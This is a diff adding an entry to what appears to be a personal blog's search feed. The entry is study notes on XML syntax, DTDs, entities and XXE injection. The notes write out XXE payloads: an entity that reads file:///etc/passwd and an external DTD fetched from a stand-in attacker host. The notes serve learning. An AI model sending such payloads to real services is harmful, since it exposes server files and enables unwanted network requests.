@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>xml</title>
+      <link href="/2025/07/08/xml/"/>
+      <url>/2025/07/08/xml/</url>
+      
+        <content type="html"><![CDATA[<h3 id="xml-basics">XML Basics</h3><ol type="1"><li>A markup language for storing and transporting data (ExtensibleMarkup Language).</li><li><strong>Syntax Rules</strong>:<ul><li>Tags must be properly nested.</li><li>Attributes must be quoted.</li><li>Every tag must have a closing tag.</li></ul></li><li><strong>Well-formed vs Valid XML</strong>:<ul><li>Well-formed = syntactically correct</li><li>Valid = matches a schema (DTD/XSD)</li></ul></li></ol><h3 id="dtd-document-type-definition-key-for-xxe"><strong>DTD (DocumentType Definition)</strong> – key for XXE</h3><ol type="1"><li><p><strong>nternal DTD</strong> vs <strong>External DTD</strong></p><ul><li><p>Internal:</p><pre class="language-markup" data-language="markup"><code class="language-markup">CopyEdit<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre></li><li><p>External (used in XXE attacks):</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token name">SYSTEM</span> <span class="token string">"http://attacker.com/evil.dtd"</span><span class="token punctuation">></span></span></code></pre></li></ul></li></ol><h3 id="entities-in-xml-core-of-xxe"><strong>Entities in XML</strong>(🔥 Core of XXE)</h3><ul><li><p><strong>Predefined Entities</strong>: <code>&lt;</code>,<code>&gt;</code>, <code>&amp;</code>, etc.</p></li><li><p><strong>Custom Entities</strong> (can reference files orURLs):</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"></code></pre></li><li><p>Types:</p><ul><li>Internal entity:<code>&lt;!ENTITY example "This is an example"&gt;</code></li><li>External entity:<code>&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</code></li></ul></li></ul><h3 id="xml-parsers"><strong>XML Parsers</strong></h3><ul><li>Understand how different languages handle XML:<ul><li>Java (e.g., DOM, SAX, StAX, JAXP)</li><li>Python (<code>xml.etree.ElementTree</code>, <code>lxml</code>)</li><li>PHP (<code>SimpleXML</code>, <code>DOMDocument</code>)</li></ul></li><li>Focus on <strong>parser behavior with external entities</strong> —whether XXE is enabled or not.</li></ul><h3 id="xxe-injection"><strong>XXE Injection</strong></h3><ul><li><p><strong>Goal</strong>: Trick XML parsers into reading sensitivefiles or initiating network requests.</p></li><li><p><strong>Payload Example</strong>:</p><pre class="language-markup" data-language="markup"><code class="language-markup">xmlCopyEdit<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Program design </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xml </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Mysql</title>
       <link href="/2025/06/20/mysql/"/>
       <url>/2025/06/20/mysql/</url>
